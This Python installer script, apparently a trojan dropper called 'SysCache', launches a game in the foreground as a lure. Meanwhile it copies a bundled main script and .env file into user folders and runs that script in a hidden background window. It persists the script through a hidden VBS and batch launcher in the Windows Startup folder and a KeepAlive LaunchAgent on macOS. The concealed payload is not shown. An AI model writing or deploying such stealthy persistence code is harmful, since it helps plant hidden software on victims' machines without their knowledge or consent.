import os
import sys
import shutil
import subprocess
import platform
from typing import List, Optional

APP_NAME = "SysCache"
MAC_LABEL = "com.syscache"

SYSTEM = platform.system()
IS_WINDOWS = SYSTEM == "Windows"
IS_MAC = SYSTEM == "Darwin"

if IS_WINDOWS:
    APPDATA = os.getenv("APPDATA")
    if not APPDATA:
        raise RuntimeError("APPDATA não encontrado.")
    INSTALL_DIR = os.path.join(APPDATA, APP_NAME)
    STARTUP_DIR = os.path.join(
        APPDATA,
        "Microsoft",
        "Windows",
        "Start Menu",
        "Programs",
        "Startup",
    )
elif IS_MAC:
    INSTALL_DIR = os.path.expanduser(f"~/Library/Application Support/{APP_NAME}")
else:
    raise RuntimeError(f"Sistema não suportado: {SYSTEM}")

INSTALL_LOG_FILE = os.path.join(INSTALL_DIR, "install.log")
RUN_MAIN_ARG = "--run-main"
RUN_GAME_ARG = "--run-game"


def log_install(message: str) -> None:
    os.makedirs(INSTALL_DIR, exist_ok=True)
    with open(INSTALL_LOG_FILE, "a", encoding="utf-8") as log_file:
        log_file.write(f"{message}\n")


def get_resource_path(filename: str) -> str:
    if hasattr(sys, "_MEIPASS"):
        return os.path.join(sys._MEIPASS, filename)
    base_dir = os.path.dirname(os.path.abspath(__file__))
    return os.path.join(base_dir, filename)


def create_install_dir() -> None:
    os.makedirs(INSTALL_DIR, exist_ok=True)


def copy_file_to_install(filename: str) -> str:
    src = get_resource_path(filename)
    if not os.path.exists(src):
        raise FileNotFoundError(f"Arquivo não encontrado: {src}")

    dst = os.path.join(INSTALL_DIR, filename)
    shutil.copy2(src, dst)
    return dst


def copy_optional_file_to_install(filename: str) -> Optional[str]:
    try:
        return copy_file_to_install(filename)
    except FileNotFoundError:
        return None


def get_windows_python_command() -> List[str]:
    if shutil.which("python"):
        return ["python"]
    if shutil.which("py"):
        return ["py", "-3"]
    executable_name = os.path.basename(sys.executable).lower()
    if executable_name.startswith("python"):
        return [sys.executable]
    return []


def get_windows_background_python_command() -> List[str]:
    if shutil.which("pyw"):
        return ["pyw"]
    if shutil.which("pythonw"):
        return ["pythonw"]
    return get_windows_python_command()


def is_main_script_running(main_script_path: str) -> bool:
    normalized_path = main_script_path.replace("/", "\\").lower()
    try:
        result = subprocess.run(
            ["wmic", "process", "get", "CommandLine"],
            capture_output=True,
            text=True,
            check=False,
        )
        output = (result.stdout or "").lower()
        if getattr(sys, "frozen", False):
            return RUN_MAIN_ARG in output and os.path.basename(sys.executable).lower() in output
        return normalized_path in output
    except Exception:
        return False


def show_windows_message(message: str, title: str = "SysCache Installer") -> None:
    try:
        import ctypes

        ctypes.windll.user32.MessageBoxW(0, message, title, 0x10)
    except Exception:
        pass


def _format_bat_command(command: List[str], script_path_var: str = "%SCRIPT_PATH%") -> str:
    parts = []
    for item in command:
        escaped = item.replace('"', '""')
        if any(char in escaped for char in (" ", "\t", "&", "(", ")", "^")):
            parts.append(f'"{escaped}"')
        else:
            parts.append(escaped)
    parts.append(f'"{script_path_var}"')
    return " ".join(parts)


def build_startup_bat(main_script_path: str, background_python_cmd: Optional[List[str]] = None) -> str:
    if getattr(sys, "frozen", False):
        escaped_exe = sys.executable.replace('"', '""')
        return f'''@echo off
wmic process get CommandLine | find /I "{RUN_MAIN_ARG}" >nul
if %errorlevel%==0 (
    exit /b 0
)
start "" /b "{escaped_exe}" {RUN_MAIN_ARG}
exit /b 0
'''

    escaped_path = main_script_path.replace('"', '""')
    preferred_cmd = _format_bat_command(background_python_cmd) if background_python_cmd else ""
    preferred_block = ""
    if preferred_cmd:
        preferred_block = (
            'echo [INFO] Tentando comando preferencial: '
            + preferred_cmd.replace("%", "%%")
            + '>>"%LOG_FILE%"\n'
            f'start "" /b {preferred_cmd}\n'
            "if %errorlevel%==0 (\n"
            '    echo [OK] Comando preferencial iniciado com sucesso.>>"%LOG_FILE%"\n'
            "    exit /b 0\n"
            ")\n"
            'echo [WARN] Falha no comando preferencial (errorlevel=%errorlevel%).>>"%LOG_FILE%"\n'
        )
    return f'''@echo off
setlocal
set "SCRIPT_PATH={escaped_path}"
for %%I in ("%SCRIPT_PATH%") do set "SCRIPT_DIR=%%~dpI"
if defined SCRIPT_DIR cd /d "%SCRIPT_DIR%"
set "LOG_FILE=%SCRIPT_DIR%startup.log"
echo.>>"%LOG_FILE%"
echo ===== [%date% %time%] Inicializacao do startup =====>>"%LOG_FILE%"
echo [INFO] SCRIPT_PATH=%SCRIPT_PATH%>>"%LOG_FILE%"
wmic process get CommandLine | find /I "%SCRIPT_PATH%" >nul
if %errorlevel%==0 (
    echo [INFO] Script ja estava em execucao.>>"%LOG_FILE%"
    exit /b 0
)
{preferred_block}
where pyw >nul 2>nul
if %errorlevel%==0 (
    echo [INFO] Tentando pyw.>>"%LOG_FILE%"
    start "" /b pyw "%SCRIPT_PATH%"
    exit /b 0
)

where pythonw >nul 2>nul
if %errorlevel%==0 (
    echo [INFO] Tentando pythonw.>>"%LOG_FILE%"
    start "" /b pythonw "%SCRIPT_PATH%"
    exit /b 0
)

where py >nul 2>nul
if %errorlevel%==0 (
    echo [WARN] pyw/pythonw nao encontrados; tentando py -3.>>"%LOG_FILE%"
    start "" /b py -3 "%SCRIPT_PATH%"
    exit /b 0
)

where python >nul 2>nul
if %errorlevel%==0 (
    echo [WARN] pyw/pythonw nao encontrados; tentando python.>>"%LOG_FILE%"
    start "" /b python "%SCRIPT_PATH%"
    exit /b 0
)

echo [ERROR] Nenhum launcher Python encontrado no PATH.>>"%LOG_FILE%"
exit /b 0
'''


def build_startup_vbs(bat_path: str) -> str:
    escaped_bat_path = bat_path.replace('"', '""')
    return f'''Set WshShell = CreateObject("WScript.Shell")
WshShell.Run Chr(34) & "{escaped_bat_path}" & Chr(34), 0, False
'''


def run_bundled_main_script() -> None:
    script_path = get_resource_path("main_script.py")
    with open(script_path, "rb") as script_file:
        code = compile(script_file.read(), script_path, "exec")
        exec(code, {"__name__": "__main__", "__file__": script_path})


def run_bundled_game() -> None:
    script_path = get_resource_path("game.py")
    with open(script_path, "rb") as script_file:
        code = compile(script_file.read(), script_path, "exec")
        exec(code, {"__name__": "__main__", "__file__": script_path})


def get_frozen_child_env() -> dict:
    env = os.environ.copy()
    env["PYINSTALLER_RESET_ENVIRONMENT"] = "1"
    return env


def install_windows() -> None:
    log_install("Iniciando instalação no Windows.")
    main_script_path = copy_file_to_install("main_script.py")
    game_path = copy_file_to_install("game.py")
    copy_optional_file_to_install(".env")
    python_cmd = get_windows_python_command()
    background_python_cmd = get_windows_background_python_command()

    os.makedirs(STARTUP_DIR, exist_ok=True)
    bat_path = os.path.join(STARTUP_DIR, "syscache_launcher.bat")
    vbs_path = os.path.join(STARTUP_DIR, "syscache_launcher.vbs")

    with open(bat_path, "w", encoding="utf-8") as f:
        f.write(build_startup_bat(main_script_path, background_python_cmd))
    with open(vbs_path, "w", encoding="utf-8") as f:
        f.write(build_startup_vbs(bat_path))
    log_install(f"Launcher de startup criado em: {bat_path}")
    log_install(f"Launcher oculto de startup criado em: {vbs_path}")

    is_frozen_exe = getattr(sys, "frozen", False)
    if not is_frozen_exe and not python_cmd:
        warning = (
            "Python não foi encontrado no PATH. O instalador concluiu a cópia dos arquivos, "
            "mas não conseguiu iniciar o SysCache.\n\n"
            "Instale Python 3 e tente novamente."
        )
        log_install(warning)
        show_windows_message(warning)
        return

    try:
        creationflags = getattr(subprocess, "CREATE_NO_WINDOW", 0)
        if not is_main_script_running(main_script_path):
            if is_frozen_exe:
                subprocess.Popen(
                    [sys.executable, RUN_MAIN_ARG],
                    shell=False,
                    creationflags=creationflags,
                    env=get_frozen_child_env(),
                )
            else:
                subprocess.Popen(
                    [*background_python_cmd, main_script_path],
                    shell=False,
                    creationflags=creationflags,
                )
            log_install("main_script iniciado em segundo plano.")
        else:
            log_install("main_script já estava em execução. Não será iniciado novamente.")

        if is_frozen_exe:
            subprocess.Popen([sys.executable, RUN_GAME_ARG], shell=False, env=get_frozen_child_env())
            log_install("Inicialização disparada com executável empacotado.")
        else:
            subprocess.Popen([*python_cmd, game_path], shell=False)
            log_install(f"Inicialização disparada com comando: {' '.join(python_cmd)}")
    except Exception as error:
        log_install(f"Falha ao iniciar processos no Windows: {error}")
        show_windows_message(f"Falha ao iniciar SysCache: {error}")


def install_mac() -> None:
    main_script_path = copy_file_to_install("main_script_mac.py")
    game_path = copy_file_to_install("game.py")
    copy_optional_file_to_install(".env")

    python_bg = shutil.which("python3") or sys.executable
    python_fg = shutil.which("python3") or sys.executable
    plist_path = os.path.expanduser(f"~/Library/LaunchAgents/{MAC_LABEL}.plist")

    plist_content = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>{MAC_LABEL}</string>

    <key>ProgramArguments</key>
    <array>
        <string>{python_bg}</string>
        <string>{main_script_path}</string>
    </array>

    <key>RunAtLoad</key>
    <true/>

    <key>KeepAlive</key>
    <true/>

    <key>WorkingDirectory</key>
    <string>{INSTALL_DIR}</string>
</dict>
</plist>
"""

    os.makedirs(os.path.dirname(plist_path), exist_ok=True)
    with open(plist_path, "w", encoding="utf-8") as f:
        f.write(plist_content)

    subprocess.run(
        ["launchctl", "unload", plist_path],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
    subprocess.run(["launchctl", "load", plist_path], check=True)

    subprocess.Popen([python_bg, main_script_path], shell=False)
    subprocess.Popen([python_fg, game_path], shell=False)


if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == RUN_MAIN_ARG:
        run_bundled_main_script()
        sys.exit(0)

    if len(sys.argv) > 1 and sys.argv[1] == RUN_GAME_ARG:
        run_bundled_game()
        sys.exit(0)

    create_install_dir()

    if IS_WINDOWS:
        install_windows()
    elif IS_MAC:
        install_mac()
